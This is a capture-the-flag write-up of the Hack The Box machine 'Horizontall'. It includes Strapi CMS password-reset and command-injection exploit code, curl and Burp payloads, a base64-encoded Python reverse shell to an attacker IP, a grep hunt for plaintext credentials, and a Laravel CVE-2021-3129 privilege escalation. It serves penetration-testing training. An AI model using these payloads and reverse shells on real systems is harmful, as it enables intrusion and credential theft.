# Horizontall

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Topics** | Web, Virtual Hosting, nginx 1.14.0, Javascript, Subdomain Enum, Strapi, strapiVersion 3.0.0-beta.17.4, SSH Tunel, SSH Port Forward, Laravel v8 (PHP v7.4.18) |

---

## 📁 Folder Structure

- [`content/`](content/) — screenshots and inline references used in the write-up
- [`nmap/`](nmap/) — raw nmap output files
- [`exploit/`](exploit/) — exploit scripts, binaries, payloads, and other tools used

---

# Enumeration

## Nmap

SYN Stealth Scan

```bash
sudo nmap -p- -sS --open --min-rate 5000 -Pn -n -v 10.10.11.105 -oN AllPorts
```

Result:

```markdown
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

TCP Full Scan: 

```bash
nmap -sCV -p22,80 -Pn -n -v 10.10.11.105 -oN FullScan
```

Result: 

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Note: The scan reveals that machine is using virtual hosting, hence, we need to add the domain `horizontall.htb` to the `/etc/hosts`

Web Inspection: 

![Untitled](content/Untitled.png)

**Web Fuzzing: http://horizontall.htb**

File Extensions / Paths

-No additional directories were found after enumerating with wfuzz

Subdomains:

```bash
wfuzz -c --hc=400,403,404 --hw=13 -t 20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u 'http://horizontall.htb' -H "Host: FUZZ.horizontall.htb"
```

Result: 

```bash
000000001:   200        1 L      43 W       901 Ch      "www"                                                                    
000047093:   200        19 L     33 W       413 Ch      "api-prod"
```

As we can see, there is a subdomain identified as `api-prod`.

Another way to find the additional subdomain was to intercepting the GET request and the response using Burpsuite: 

![Untitled](content/Untitled%201.png)

Web Inspection: http://api-prod.horizontall.htb

![Untitled](content/Untitled%202.png)

**Web Fuzzing: http://api-prod.horizontall.htb**

```bash
wfuzz -c --hc=400,403,404 -t 20 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
```

Result:

```bash
000000137:   200        0 L      21 W       507 Ch      "reviews"                                                                 
000000259:   200        16 L     101 W      854 Ch      "admin"                                                                   
000001609:   200        0 L      21 W       507 Ch      "Reviews"                                                                 
000006098:   200        16 L     101 W      854 Ch      "Admin"                                                                   
000029309:   200        0 L      21 W       507 Ch      "REVIEWS"                                                                 
```

From the output above, we can see that `admin` directory seems to be the most promising one. 

Web Inspection: `/admin` 

![Untitled](content/Untitled%203.png)

According to the official documentation, Strapi is **an open-source, Node.** **js based, Headless CMS** that saves developers a lot of development time while giving them the freedom to use their favorite tools and frameworks. Strapi also enables content editors to streamline content delivery (text, images, video, etc) across any devices.

Inspecting the version of Stapi

Using Burpsuite, make a request to [`http://api-prod.horizontall.htb/admin/`](http://api-prod.horizontall.htb/admin/) (set Intercept to off)

![Untitled](content/Untitled%204.png)

Checking the HTTP History, we will see a request to `/admin/init` and from the response  we will see the version of Strapi running on this server. 

Version:

```bash
strapiVersion":"3.0.0-beta.17.4"
```

Searchsploit Vulnerabilities: 

![Untitled](content/Untitled%205.png)

Based on the Strapi version we should be able to use the following exploits : 

```bash
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) 
#or
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)   
```

Since we are doing a OSCP Like, we will use the first one as we can’t use Metasploit in the exam. 

# Initial Access

After the initial enumeration we found a potential exploit that result in a RCE without having valid credentials (authenticated). 

Checking the exploit code: `Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)`

```bash
def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")

def code_exec(cmd):
    global jwt, url
    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)
```

Explanation: 

1. **Password Reset (`password_reset` function):**
The server is vulnerable to a password reset attack. The exploit sends a POST request to the **`/admin/auth/reset-password`** endpoint with crafted parameters. The crafted parameters include a MongoDB query operator (**`$gt`**) in the **`code`** field, causing a greater than comparison that evaluates to true. This bypasses the password reset validation, allowing the attacker to reset the password.
    
    The function then extracts the JSON Web Token (JWT) from the response, as well as the username and email of the affected user. If the JWT is not found in the response, the exploit exits with an error message. Otherwise, it prints the details of the successful password reset, including the new credentials.
    
2. **Remote Code Execution (`code_exec` function):**
This function triggers remote code execution on the target system. It sends a POST request to the **`/admin/plugins/install`** endpoint with crafted data. The **`plugin`** field is manipulated to inject the desired command to be executed in the **`documentation`** context. The payload is constructed using command substitution to execute arbitrary commands. The **`port`** field is set to "1337".
    
    The response text of the request is printed, but since this is a blind RCE (Remote Code Execution) attempt, the output of the executed command might not be visible in the response. 
    

Let’s use the exploit:

```bash
python3 StrapiCMS-exploit.py http://api-prod.horizontall.htb
```

For the reverse shell we will use the python version (shortest) and encoded in Base64 from https://www.revshells.com/

```bash
echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjUiLDQ0NDQpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn | base64 -d | sh
```

Result: 

![Untitled](content/Untitled%206.png)

Success! We got access as strapi user. 

---

### Optional: Manual exploitation

1- Reset the password 

We can use curl to make a POST request and send the parameters required for the password reset. Use the following command: 

```bash
curl -X POST "http://api-prod.horizontall.htb/admin/auth/reset-password" -H "Content-Type: application/json" -d '{"code":{"$gt":0},"password":"NewStrongPassword","passwordConfirmation":"NewStrongPassword"}'
```

Expected response: The server will reply with the following response

```bash
{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjkyNTczMDU1LCJleHAiOjE2OTUxNjUwNTV9.1i2lNLD62QGCjZ87s4AUlly2M_6dDtoTrsYvS6URdg8","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}
```

As we can see in the response, there is a Json Web token, username and email. 

Note: the password was set to `NewStrongPassword` but you can change it to whatever you want. 

2- Remote Code Execution: 

For the RCE we need to have the JWT (previously generated) and replace it in the following command and also replace the command to execute: 

```bash
curl -X POST "http://api-prod.horizontall.htb/admin/plugins/install" -H "Authorization: Bearer <JWT TOKEN>" -H "Content-Type: application/json" -d '{"plugin":"documentation && $(command-to-execute)","port":"1337"}'
```

Note #1: two important things 

1- According to the initial exploit, this is a blind RCE so we can't have any output to our commands or result to verify if it worked. 

2- In order to verify if we have RCE, we can use the following 2 methods: 

a-  Replace the command to execute with a `ping -c1 kali-ip` and use tcpdump to capture any ICMP packet. If we receive an ICMP request, then, it means we have RCE. 

b- Replace the command to execute with a `wget` request to our kali machine, create a python http server in kali to see all the requests coming. 

Note #2: For the reverse shells, the bash-based ones didn’t work for me, so, I use the ones based in python. However, how can we know if python is installed in the victim machine? Simple, since we already have RCE (Blind), we can send a `wget` request to our kali but this time we add the command `$(which python)` as part of the URL, so, in this way, if the python is installed, we should received a GET request with something like `GET //usr/bin/python` confirming that python is installed. 

URL Request: 

```bash
wget http://<kali-ip>/$(which python)
```

Request in our kali: 

![Untitled](content/Untitled%207.png)

---

### Burpsuite: Using burp for the RCE

Payload: Remember to repace the JWT Token

```bash
POST /admin/plugins/install HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Authorization: Bearer JTW_TOKEN
Content-Length: 88
Content-Type: application/json

{"plugin": "documentation && $(command-to-execute)", "port": "1337"}
```

## Additional Info:

Once gained access as Strapi, we will see another user in the system identified as `developer`

![Untitled](content/Untitled%208.png)

![Untitled](content/Untitled%209.png)

We can try to find credentials running the following command: 

```bash
grep -R "password\":" /opt* 2>/dev/null | grep -E "config|admin" | grep -vE "translations"
```

Note: `/opt` is the directory where the strapi is running, hence, it is expected to contain sensitive information from the configuration. 

Result: 

```bash
/opt/strapi/myapi/config/environments/production/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",
/opt/strapi/myapi/config/environments/development/database.json:        "password": "#J!:F9Zt2u"
/opt/strapi/myapi/config/environments/staging/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",
/opt/strapi/myapi/.cache/plugins/strapi-plugin-content-type-builder/admin/src/containers/ModelPage/tests/initialData.json:      "password": {
/opt/strapi/myapi/.cache/plugins/strapi-plugin-content-type-builder/admin/src/containers/ModelPage/tests/initialData.json:      "password": {
/opt/strapi/myapi/node_modules/strapi-admin/models/Administrator.settings.json:    "password": {
/opt/strapi/myapi/node_modules/strapi-plugin-content-type-builder/admin/src/containers/ModelPage/tests/initialData.json:      "password": {
/opt/strapi/myapi/node_modules/strapi-plugin-content-type-builder/admin/src/containers/ModelPage/tests/initialData.json:      "password": {
```

Looks like the file `/opt/strapi/myapi/config/environments/development/database.json` contains one plain-text password. 

Let’s check the content:

```bash
strapi@horizontall:~$ cat /opt/strapi/myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

We can see the credentials for MYSQL for the user `developer`

# Privilege Escalation

Checking the additional services running on the server using `netstat` we will see 3 additional ports that are not publicly exposed.

Those ports are: 3306 (MysQL), 1337 (strapi), and 8000 (possible HTTP server). 

![Untitled](content/Untitled%2010.png)

Let’s check the port 8000 by sending a curl request:

```bash
curl 127.0.0.1:8000
```

Response (relevant):

```bash
<div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
                                    Laravel has wonderful, thorough documentation covering every aspect of the framework. Whether you are new to the framework or have previous experience with Laravel, we recommend reading all of the documentation from beginning to end.
```

From the response we can assume that the server is running some kind of Laravel instance. 
To have full communication with this server we need to create a SSH tunnel, however, we need to inyect our RSA Public key in the authorized hosts for the victim machine since we don’t pose valid credentials. 

### SSH Port Forwarding

1- Generate rsa key pairs with `ssh-keygen` in our kali machine

2- Copy the content of `id_rsa.pub` from our kali machine, and paste it in the `authorized_keys` file on the victim machine. (for strapid user, the home should be in `/opt/strapi/.ssh/`)

3- Copy the `id_rsa` and `id_rsa.pub` from our kali to the victim machine. 

4- Do a ssh from our kali machine to the victim machine. It should not ask for password. 

![Untitled](content/Untitled%2011.png)

4- From our kali machine, create a SSH tunnel using the following command: 

```bash
ssh -i ~/.ssh/id_rsa -L port-kali:localhost-target:target-port username-target@target-ip
```

It should look like this: 

```bash
ssh -i ~/.ssh/id_rsa -L 8000:localhost:8000 strapi@10.10.11.105
```

Onced created we should be able to see a new port opened (8000) in our kali: 

![Untitled](content/Untitled%2012.png)

Done, we can now perform all the requests towards our loopback IP (127.0.0.1) on port 8000, which will be forwarded towards the victim machine on the port 8000. 

Web Inspection: `http://localhost:8000`

![Untitled](content/Untitled%2013.png)

First thing we noticed is the current version of Laravel, which appears to be: `Laravel v8 (PHP v7.4.18)`

However, let’s enumerate first if there are more directories available. 

Web Enumeration: 

⚠️Important: Remember that we can’t send too many requests to our loopback as we are using a SSH tunnel, sending multiple requests will cause the tunnel to crash/close, hence, let’s use a small dictionary. 

```bash
wfuzz -c --hc=400,403,404 -t 5 -w /usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt http://127.0.0.1:8000/FUZZ
```

Result:

```bash
000000773:   500        247 L    18586 W    611916 Ch   "profiles"
```

We can see that server responded with a HTTP 500 Error, which is a server-side error. 

Let’s try to inspect that directory: 

![Untitled](content/Untitled%2014.png)

Looks like the server is providing a lot of information for debugging purposes. This may suggests that server is runnig in some kind of debug mode. 

After searching for some exploits for Laravel 8 we found the following PoC:

https://github.com/nth347/CVE-2021-3129_exploit.git

Usage: 

```bash
/exploit.py http://localhost:8000 Monolog/RCE1 command-to-execute
```

Exploit: As command to execute, we will use the `chmod +s /bin/bash` which will assign the SUID bit to the bash. 

![Untitled](content/Untitled%2015.png)

Result: 

![Untitled](content/Untitled%2016.png)

Finally, we can just use `bash -p` to spawn a privilege shell

![Untitled](content/Untitled%2017.png)

[Owned Horizontall from Hack The Box!](https://www.hackthebox.com/achievement/machine/906667/374)